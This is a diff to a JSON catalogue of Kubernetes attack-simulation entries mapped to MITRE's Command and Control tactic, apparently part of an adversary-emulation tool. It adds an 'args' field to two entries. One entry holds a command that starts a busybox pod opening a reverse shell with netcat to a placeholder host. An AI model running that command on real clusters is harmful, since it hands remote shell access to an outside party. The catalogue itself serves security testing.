@@ -6,6 +6,7 @@
     "tactic_id": "TA0011",
     "mitre_ref": "https://attack.mitre.org/tactics/TA0011/",
     "mode": "active",
+    "args": "True",
     "command": "kubectl exec $POD_NAME -n $NAMESPACE -- curl https://ipinfo.io/json",
     "leading_to": ""
     },
@@ -16,6 +17,7 @@
     "tactic_id": "TA0011",
     "mitre_ref": "https://attack.mitre.org/tactics/TA0011/",
     "mode": "active",
+    "args": "True",
     "command": "kubectl run pod-shell --image=busybox -- nc <HOST> <PORT> -e /bin/sh",
     "leading_to": ""
     }
